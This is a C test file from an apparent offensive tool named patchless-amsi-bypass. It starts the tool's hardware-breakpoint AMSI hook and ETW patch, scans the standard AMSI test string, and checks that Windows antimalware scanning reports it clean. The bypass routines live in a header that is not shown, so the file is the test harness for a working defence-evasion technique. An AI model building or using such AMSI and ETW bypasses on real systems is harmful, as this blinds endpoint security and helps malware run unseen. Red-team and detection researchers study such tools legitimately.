/* test_minimal.c
 *
 * Sanity check for patchless-amsi-bypass:
 *   1) Call bp_init(BP_AMSI_HWBP | BP_ETW_PATCH).
 *   2) Resolve and call amsi!AmsiScanBuffer on a string the installed AMSI
 *      provider would normally flag.
 *   3) Assert the result is AMSI_RESULT_CLEAN — proves the HW BP intercepted
 *      the call and rewrote the result pointer.
 *   4) Tear down via bp_shutdown().
 *
 * Authorised testing only.
 */
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include "../include/bypass.h"

typedef HANDLE  HAMSICONTEXT;
typedef HANDLE  HAMSISESSION;
typedef int     AMSI_RESULT;
#define AMSI_RESULT_CLEAN       0
#define AMSI_RESULT_DETECTED 32768

typedef HRESULT (WINAPI *AmsiInitialize_t  )(LPCWSTR, HAMSICONTEXT *);
typedef VOID    (WINAPI *AmsiUninitialize_t)(HAMSICONTEXT);
typedef HRESULT (WINAPI *AmsiOpenSession_t )(HAMSICONTEXT, HAMSISESSION *);
typedef VOID    (WINAPI *AmsiCloseSession_t)(HAMSICONTEXT, HAMSISESSION);
typedef HRESULT (WINAPI *AmsiScanBuffer_t  )(HAMSICONTEXT, PVOID, ULONG,
                                             LPCWSTR, HAMSISESSION, AMSI_RESULT *);

/* The standard AMSI test string. Defenders' AMSI providers return DETECTED on it. */
static const char AMSI_TEST_STRING[] =
    "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";

int main(void)
{
    printf("=============================================\n");
    printf(" patchless-amsi-bypass — minimal self-test\n");
    printf("=============================================\n");
    printf("[*] PID = %lu\n", (unsigned long)GetCurrentProcessId());

    printf("[*] bp_init(BP_AMSI_HWBP | BP_ETW_PATCH) ...\n");
    bp_result_t r = bp_init(BP_AMSI_HWBP | BP_ETW_PATCH);
    printf("    -> %s (code %d)\n", bp_strerror(r), (int)r);
    if (r != BP_OK) {
        printf("[-] init failed; aborting\n");
        return 1;
    }

    /* AMSI scan test */
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) {
        printf("[-] LoadLibrary(amsi.dll) failed\n");
        bp_shutdown();
        return 2;
    }

    AmsiInitialize_t   Init  = (AmsiInitialize_t  )(void*)GetProcAddress(amsi, "AmsiInitialize");
    AmsiUninitialize_t UInit = (AmsiUninitialize_t)(void*)GetProcAddress(amsi, "AmsiUninitialize");
    AmsiOpenSession_t  Open  = (AmsiOpenSession_t )(void*)GetProcAddress(amsi, "AmsiOpenSession");
    AmsiCloseSession_t Close = (AmsiCloseSession_t)(void*)GetProcAddress(amsi, "AmsiCloseSession");
    AmsiScanBuffer_t   Scan  = (AmsiScanBuffer_t  )(void*)GetProcAddress(amsi, "AmsiScanBuffer");

    if (!Init || !Scan) {
        printf("[-] amsi.dll symbols not resolvable\n");
        bp_shutdown();
        return 3;
    }

    HAMSICONTEXT ctx = NULL;
    HAMSISESSION ses = NULL;
    if (Init(L"patchless-amsi-test", &ctx) != S_OK) {
        printf("[-] AmsiInitialize failed\n");
        bp_shutdown();
        return 4;
    }
    Open(ctx, &ses);

    AMSI_RESULT res = AMSI_RESULT_DETECTED;          /* default to "detected" */
    HRESULT hr = Scan(ctx, (PVOID)AMSI_TEST_STRING,
                      (ULONG)sizeof(AMSI_TEST_STRING) - 1,
                      L"test", ses, &res);

    printf("[*] AmsiScanBuffer  hr = 0x%lx  result = %d\n",
           (unsigned long)hr, (int)res);

    if (hr == S_OK && res == AMSI_RESULT_CLEAN)
        printf("[+] AMSI BYPASS WORKED\n");
    else
        printf("[-] AMSI bypass did not engage  (result = %d)\n", (int)res);

    Close(ctx, ses);
    UInit(ctx);

    printf("[*] bp_shutdown()\n");
    bp_shutdown();
    printf("[+] done.\n");
    return 0;
}
